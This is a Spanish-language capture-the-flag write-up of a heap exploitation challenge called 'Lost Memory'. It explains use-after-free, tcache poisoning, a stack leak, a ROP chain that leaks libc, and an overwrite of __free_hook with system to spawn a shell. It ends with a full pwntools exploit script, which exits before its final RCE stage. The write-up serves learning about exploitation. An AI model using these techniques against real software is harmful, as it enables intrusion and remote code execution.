# Lost Memory

Con lo poco que sabia yo de heap explotation no me dio para resolver estos retos, pero aprendí un montón estudiando las soluciones de otros,

En este reto podiamos, asignar memoria dinamicamente, escribir y liberar. Tambien podiamos escribir una direccion del stack, RSP - 0x20 en el heap y leer su contenido, pero solo podiamos leer en esta accion.

Aqui hay que tener un poco de conocimiento de como funciona el heap: los chunks, las bins, tcache, hooks...

En primer lugar podiamos crear una primitiva de escritura arbitraria de esta forma:
```
1 --> Allocate Memory
 136
4 --> Free Memory
2 --> Write Memory
 "A"
4 --> Free Memory
2 --> Write Memory
 addr + \x00\x00\x00\x00\x00\0x00\x00\x00
1 --> Allocate Memory
 136
1 --> Allocate Memory
 136
```

Explicacion:

Asignamos memoria para crear un chunk y la liberamos, ahora tenemos un puntero que sigue apuntando alli porque en ningun momento se hace ptr=NULL.

La estructura de un chunk es mas o menos asi:
``` C
struct malloc_chunk {
 size_t prevSize;
 size_t size;
 struct malloc_chunk* fd;
 struct malloc_chunk* bkr;
 unsigned char[] data; 
}
```

Cuando un chunk esta asignado los campos bkr y fd son usados como data asi que si se escribe en esa seccion de memoria asignada, se comienza a escribir en el campo bkr.

Cuando un chunk es liberado entonces bkr(backward pinter) apunta al chunk libre anterior en la lista y fd(forward pointer) apunta al siguiente chunk libre en la lista. Esto ocurre en algunas bins si no me equivoco en algunas bins y en el tcache.

El chunk que asignamos y liberamos va al tcache, una estructura LIFO de donde se toman chunks para ser reasignados si tienen un tamaño similar a proximas asignaciones. El tcache luce asi ahoraÑ
```
tcache -> chunk1 -> NULL
                 fd
```

Si escribimos "A" en el chunk liberado sobreescribimos el fd asi que el tcache luce asi:
```
tcache -> chunk1 -> 0x41 
                 fd
```

Si liberamos de nuevo, como el fd no es NULL, `free` entonces lo asignará al tcache:
```
tcache -> chunk1 -> chunk1 --> 0x41 
                 fd            fd
```

Ese chunk ahora apunta a si mismo!, entonces si escribimos una direccion ahora mas 8 bytes nulos sobreescribimos fd y bk de chunk1 lo que sigue:
```
tcache -> chunk1 -> addr --> ?
                 fd
```

Entonces con el primer alloc obtenemos `chunk1` y con el segundo alloc obtenemos `addr` y listo, ya podemos escribir en esa direccion de memoria.

En el exploit se usa el leak del stack para calcular la direccion de retorno de main y asi hacer pivotear del heap al stack:
```
tcache -> chunk1 -> rsp + 0x20 (main_ret) --> ?
                 fd
```

```python
#leak stack
alloc(0x88) #guard
free()
write_data(b"A")
free()
store_flag_ptr()
leak = int(rcu(b"eturn value: ", "\n"),16)
leak2 = int(rcu(b"eturn value: ", "\n"),16)
rcu(b"choice:\n")
logleak("stack leak", leak)
logleak("stack leak2", leak)

# ROP to leak
write_data(p64(leak+0x20)+p64(0)) #ret address
alloc(0x88)
alloc(0x88)
```

Ahora que controlamos el flujo del programa podemos hacer un ROP para filtrar una direccion de libc y obtener la direccion base con puts:
``` python
rop = ROP(elf)

payload = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.printf)
payload += p64(elf.sym.puts)
payload += p64(elf.sym.main)
write_data(payload)
```

Para terminar hacemos un ret2libc usando la misma primitiva de escritura arbitraria pero esta vez redirigimos la escritura a `__free_hook`, una funcion que es llamada en lugar de `free` si no es NULL:

![2025-05-27-234521_1337x168_scrot](https://github.com/user-attachments/assets/10548c7a-08ed-4738-9eef-f6f0296f1271)

Suplantamos __free_hook con `system` y creamos un chunk que contenga `/bin/sh`. Al llamar a `free(chunk)` se ejecutará `system("/bin/bash")`:
```
tcache -> chunk1 -> __free_hook(system)
                 fd
tcache -> chunk1
           data "/bin/sh"
```

``` python
#tcache poison to get RCE by overwriting the free hook
alloc(0x98)
free()
write_data(b"A")
free()
write_data(p64(libc.sym.__free_hook)+p64(0)) #ret address
alloc(0x98)
alloc(0x98)
write_data(p64(libc.sym.system))
alloc(0x18)
write_data(b"/bin/sh\0")
sleep(0.2)
# call free_hook
sl(b"4")
```

Exploit completo:
``` py
#!/usr/bin/env python3

from pwn import *

elf = ELF("./lost_memory")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
continue
'''
def start():
    if args.REMOTE:
        return remote("challenge.nahamcon.com", 30427)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

rcu(b"choice:\n")

def alloc(size):
    sl(b"1")
    sla(b"What size would you like?", bc(size))
    rcu(b"choice:\n")

def write_data(data):
    sl(b"2")
    sla(b"What would you like to write?", data)
    rcu(b"choice:\n")

def select_index(index):
    sl(b"3")
    sla(b"(0 - 9)", bc(index))
    rcu(b"choice:\n")

def free():
    sl(b"4")
    rcu(b"choice:\n")

def store_flag_ptr():
    sl(b"5")
    #rcu(b"choice:\n")

def exit_program():
    sl(b"6")  # menu option
#========= exploit here ===================
#rcu(b"choice:\n")

r.timeout = 1
#leak stack
alloc(0x88) #guard
free()
write_data(b"A")
free()
store_flag_ptr()
leak = int(rcu(b"eturn value: ", "\n"),16)
leak2 = int(rcu(b"eturn value: ", "\n"),16)
rcu(b"choice:\n")
logleak("stack leak", leak)
logleak("stack leak2", leak)

# ROP to leak
write_data(p64(leak+0x20)+p64(0)) #ret address
alloc(0x88)
alloc(0x88)

rop = ROP(elf)

payload = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.printf)
payload += p64(elf.sym.puts)
payload += p64(elf.sym.main)
write_data(payload)
#trigger ret
exit_program()
r.recvline()
# get libc leak
leak = u64(r.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.printf
libcbase()
exit(0)
#tcache poison to get RCE by overwriting the free hook
alloc(0x98)
free()
write_data(b"A")
free()
write_data(p64(libc.sym.__free_hook)+p64(0)) #ret address
alloc(0x98)
alloc(0x98)
write_data(p64(libc.sym.system))
alloc(0x18)
write_data(b"/bin/sh\0")
sleep(0.2)
# call free_hook
sl(b"4")
#========= interactive ====================
r.interactive()
```




